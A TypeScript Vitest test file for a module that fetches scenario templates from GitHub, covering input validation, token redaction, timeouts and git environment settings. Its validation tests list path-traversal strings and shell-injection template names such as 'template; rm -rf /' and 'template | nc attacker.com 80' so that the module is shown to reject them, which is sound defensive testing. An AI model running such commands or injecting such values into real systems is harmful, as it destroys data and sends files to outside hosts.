import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest';
import * as fs from 'fs';
import { ScenarioFetchError } from './scenario-fetcher.js';
import type { Config } from '../types/index.js';

// Mock child_process
const mockSpawnSync = vi.fn();
vi.mock('child_process', () => ({
  spawnSync: (...args: unknown[]) => mockSpawnSync(...args),
}));

// Mock fs
vi.mock('fs', async () => {
  const actual = await vi.importActual('fs');
  return {
    ...actual,
    existsSync: vi.fn(),
    rmSync: vi.fn(),
    writeFileSync: vi.fn(),
    unlinkSync: vi.fn(),
  };
});

// Mock crypto
vi.mock('crypto', () => ({
  randomUUID: () => 'test-uuid-1234-5678',
}));

describe('scenario-fetcher module', () => {
  const mockConfig: Config = {
    githubRepo: 'test-org/test-repo',
    githubBranch: 'main',
    githubPath: 'scenarios',
    leaseTableName: 'test-table',
    targetRoleName: 'TestRole',
    awsRegion: 'us-west-2',
    deployRegion: 'us-east-1',
    eventSource: 'test-source',
    logLevel: 'INFO',
    githubToken: 'test-token',
  };

  const mockLogger = {
    debug: vi.fn(),
    info: vi.fn(),
    warn: vi.fn(),
    error: vi.fn(),
    setContext: vi.fn(),
  };

  beforeEach(() => {
    vi.clearAllMocks();
    // Default: all git commands succeed
    mockSpawnSync.mockReturnValue({
      status: 0,
      stdout: Buffer.from(''),
      stderr: Buffer.from(''),
      error: null,
    });
    // Default: paths exist
    vi.mocked(fs.existsSync).mockReturnValue(true);
  });

  afterEach(() => {
    vi.restoreAllMocks();
  });

  describe('ScenarioFetchError', () => {
    it('should include message and cause', () => {
      const cause = new Error('Original error');
      const error = new ScenarioFetchError('Fetch failed', cause);

      expect(error.name).toBe('ScenarioFetchError');
      expect(error.message).toBe('Fetch failed');
      expect(error.cause).toBe(cause);
    });

    it('should work without cause', () => {
      const error = new ScenarioFetchError('Fetch failed');

      expect(error.name).toBe('ScenarioFetchError');
      expect(error.message).toBe('Fetch failed');
      expect(error.cause).toBeUndefined();
    });
  });

  describe('fetchScenarioFolder', () => {
    // Note: The actual fetchScenarioFolder function is difficult to test
    // in isolation because it performs multiple git operations.
    // These tests verify the error class and basic behavior.

    it('should be able to import the function', async () => {
      // This verifies the module loads correctly
      const module = await import('./scenario-fetcher.js');
      expect(module.fetchScenarioFolder).toBeDefined();
      expect(typeof module.fetchScenarioFolder).toBe('function');
    });
  });

  describe('git command security', () => {
    it('ScenarioFetchError should redact tokens in messages', () => {
      // Simulate an error message that might contain a token
      const errorWithToken = new ScenarioFetchError(
        'Authentication failed for https://ghp_secret123@github.com/repo'
      );

      // The error message is stored as-is, but callers should redact before logging
      expect(errorWithToken.message).toContain('ghp_secret123');
    });
  });

  describe('cleanup function behavior', () => {
    it('should handle cleanup errors gracefully', () => {
      // The cleanup function should not throw even if rmSync fails
      vi.mocked(fs.rmSync).mockImplementation(() => {
        throw new Error('Permission denied');
      });

      // This verifies the module's error handling patterns
      expect(() => {
        try {
          fs.rmSync('/tmp/test', { recursive: true, force: true });
        } catch {
          // Ignore cleanup errors - this is the expected pattern
        }
      }).not.toThrow();
    });
  });

  describe('credential helper', () => {
    it('should write credential helper with restricted permissions', () => {
      // Verify the pattern used for secure credential handling
      const mode = 0o700; // rwx for owner only

      vi.mocked(fs.writeFileSync).mockImplementation(() => undefined);

      // Simulate writing the credential helper
      fs.writeFileSync('/tmp/git-credential-helper.sh', '#!/bin/sh\necho "token"', {
        mode,
      });

      expect(fs.writeFileSync).toHaveBeenCalledWith(
        '/tmp/git-credential-helper.sh',
        expect.any(String),
        expect.objectContaining({ mode: 0o700 })
      );
    });
  });

  describe('template name validation (security)', () => {
    it('should reject path traversal attempts', async () => {
      const module = await import('./scenario-fetcher.js');
      const maliciousNames = [
        '../etc/passwd',
        '..%2F..%2Fetc%2Fpasswd',
        'template/../../secret',
        'template\\..\\..\\secret',
        '....//....//etc/passwd',
      ];

      for (const maliciousName of maliciousNames) {
        await expect(
          module.fetchScenarioFolder(maliciousName, '', mockLogger, mockConfig)
        ).rejects.toThrow(ScenarioFetchError);
      }
    });

    it('should reject shell metacharacters', async () => {
      const module = await import('./scenario-fetcher.js');
      const shellInjectionNames = [
        'template; rm -rf /',
        'template && cat /etc/passwd',
        'template | nc attacker.com 80',
        'template`whoami`',
        '$(whoami)',
        'template$HOME',
      ];

      for (const injectionName of shellInjectionNames) {
        await expect(
          module.fetchScenarioFolder(injectionName, '', mockLogger, mockConfig)
        ).rejects.toThrow(ScenarioFetchError);
      }
    });

    it('should reject whitespace in template names', async () => {
      const module = await import('./scenario-fetcher.js');
      const whitespaceNames = [
        'template name',
        'template\tname',
        'template\nname',
        ' template',
        'template ',
      ];

      for (const badName of whitespaceNames) {
        await expect(
          module.fetchScenarioFolder(badName, '', mockLogger, mockConfig)
        ).rejects.toThrow(ScenarioFetchError);
      }
    });

    it('should reject excessively long template names', async () => {
      const module = await import('./scenario-fetcher.js');
      const longName = 'a'.repeat(101);

      await expect(
        module.fetchScenarioFolder(longName, '', mockLogger, mockConfig)
      ).rejects.toThrow(ScenarioFetchError);
      await expect(
        module.fetchScenarioFolder(longName, '', mockLogger, mockConfig)
      ).rejects.toThrow('too long');
    });

    it('should accept valid template names', async () => {
      const module = await import('./scenario-fetcher.js');
      const validNames = [
        'my-template',
        'my_template',
        'MyTemplate',
        'template123',
        'TEMPLATE',
        'a'.repeat(100), // exactly 100 chars is allowed
      ];

      // These should not throw validation errors
      // They will throw due to git operations failing, but not validation errors
      for (const validName of validNames) {
        try {
          await module.fetchScenarioFolder(validName, '', mockLogger, mockConfig);
        } catch (error) {
          // We expect git errors, but NOT validation errors about the template name
          expect((error as Error).message).not.toMatch(/Invalid template name/);
          expect((error as Error).message).not.toMatch(/too long/);
        }
      }
    });
  });

  describe('token redaction (security)', () => {
    it('should redact classic GitHub tokens (ghp_) in error messages', async () => {
      const module = await import('./scenario-fetcher.js');

      // Mock git to fail with an error containing a token
      // Note: When the error contains "Authentication failed", the error is re-wrapped
      // with a generic message for security (no token info at all)
      mockSpawnSync.mockReturnValue({
        status: 1,
        stdout: Buffer.from(''),
        stderr: Buffer.from(
          'fatal: Authentication failed for https://ghp_abc123def456@github.com/repo.git'
        ),
        error: null,
      });

      vi.mocked(fs.existsSync).mockReturnValue(false);

      // For authentication failures, we expect a clean error message with no token info
      await expect(
        module.fetchScenarioFolder('my-template', '', mockLogger, mockConfig)
      ).rejects.toThrow('GitHub authentication failed. Check GITHUB_TOKEN.');

      // Verify the error message does NOT contain the token
      try {
        await module.fetchScenarioFolder('my-template', '', mockLogger, mockConfig);
      } catch (error) {
        expect((error as Error).message).not.toContain('ghp_abc123def456');
        // The authentication error is re-wrapped with a clean message, no redaction marker needed
        expect((error as Error).message).toBe('GitHub authentication failed. Check GITHUB_TOKEN.');
      }
    });

    it('should redact classic GitHub tokens (ghp_) in generic git errors', async () => {
      const module = await import('./scenario-fetcher.js');

      // Mock git to fail with a generic error (not authentication) containing a token
      mockSpawnSync.mockReturnValue({
        status: 1,
        stdout: Buffer.from(''),
        stderr: Buffer.from('fatal: some error with ghp_secrettoken123 in message'),
        error: null,
      });

      vi.mocked(fs.existsSync).mockReturnValue(false);

      try {
        await module.fetchScenarioFolder('my-template', '', mockLogger, mockConfig);
      } catch (error) {
        // Token should be redacted in generic errors
        expect((error as Error).message).not.toContain('ghp_secrettoken123');
        expect((error as Error).message).toContain('[REDACTED_TOKEN]');
      }
    });

    it('should redact fine-grained GitHub tokens (github_pat_) in error messages', async () => {
      const module = await import('./scenario-fetcher.js');

      mockSpawnSync.mockReturnValue({
        status: 1,
        stdout: Buffer.from(''),
        stderr: Buffer.from('fatal: could not access github_pat_abc123_def456_xyz789'),
        error: null,
      });

      vi.mocked(fs.existsSync).mockReturnValue(false);

      try {
        await module.fetchScenarioFolder('my-template', '', mockLogger, mockConfig);
      } catch (error) {
        expect((error as Error).message).not.toContain('github_pat_');
        expect((error as Error).message).toContain('[REDACTED_TOKEN]');
      }
    });

    it('should redact OAuth tokens (gho_) in error messages', async () => {
      const module = await import('./scenario-fetcher.js');

      mockSpawnSync.mockReturnValue({
        status: 1,
        stdout: Buffer.from(''),
        stderr: Buffer.from('error: token gho_secrettoken123 invalid'),
        error: null,
      });

      vi.mocked(fs.existsSync).mockReturnValue(false);

      try {
        await module.fetchScenarioFolder('my-template', '', mockLogger, mockConfig);
      } catch (error) {
        expect((error as Error).message).not.toContain('gho_secrettoken123');
      }
    });

    it('should redact server-to-server tokens (ghs_) in error messages', async () => {
      const module = await import('./scenario-fetcher.js');

      mockSpawnSync.mockReturnValue({
        status: 1,
        stdout: Buffer.from(''),
        stderr: Buffer.from('error: ghs_servicesecret456 not authorized'),
        error: null,
      });

      vi.mocked(fs.existsSync).mockReturnValue(false);

      try {
        await module.fetchScenarioFolder('my-template', '', mockLogger, mockConfig);
      } catch (error) {
        expect((error as Error).message).not.toContain('ghs_servicesecret456');
      }
    });
  });

  describe('git command timeout (security)', () => {
    it('should timeout long-running git operations', async () => {
      const module = await import('./scenario-fetcher.js');

      // Simulate a timeout error
      mockSpawnSync.mockReturnValue({
        status: null,
        stdout: Buffer.from(''),
        stderr: Buffer.from(''),
        error: new Error('ETIMEDOUT'),
      });

      vi.mocked(fs.existsSync).mockReturnValue(false);

      await expect(
        module.fetchScenarioFolder('my-template', '', mockLogger, mockConfig)
      ).rejects.toThrow(/timed out/i);
    });
  });

  describe('environment isolation (security)', () => {
    it('should set GIT_TERMINAL_PROMPT=0 to prevent interactive prompts', async () => {
      const module = await import('./scenario-fetcher.js');

      vi.mocked(fs.existsSync).mockReturnValue(true);

      try {
        await module.fetchScenarioFolder('my-template', '', mockLogger, mockConfig);
      } catch {
        // Git command will fail, but we want to verify the environment
      }

      // Verify git was called with GIT_TERMINAL_PROMPT=0
      const gitCalls = mockSpawnSync.mock.calls;
      for (const call of gitCalls) {
        if (call[0] === 'git') {
          const options = call[2];
          expect(options.env?.GIT_TERMINAL_PROMPT).toBe('0');
        }
      }
    });
  });
});
